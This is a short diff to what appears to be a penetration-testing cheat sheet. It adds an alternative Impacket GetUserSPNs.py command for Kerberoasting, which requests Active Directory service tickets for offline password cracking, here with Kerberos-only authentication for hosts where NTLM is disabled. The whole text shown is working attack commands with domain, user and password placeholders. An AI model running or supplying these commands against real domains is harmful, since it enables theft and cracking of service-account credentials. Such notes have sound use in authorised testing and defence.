@@ -90,5 +90,7 @@ rev2self
 Kerboroasting
 ---------------------------
 GetUserSPNs.py <domain>/username:password -dc-ip <domainIP> -request
+OR
+python3 GetUserSPNs.py <domain>/username:password -dc-host <full domain> -k -no-pass -request     // if NTLM is disabled
 
 
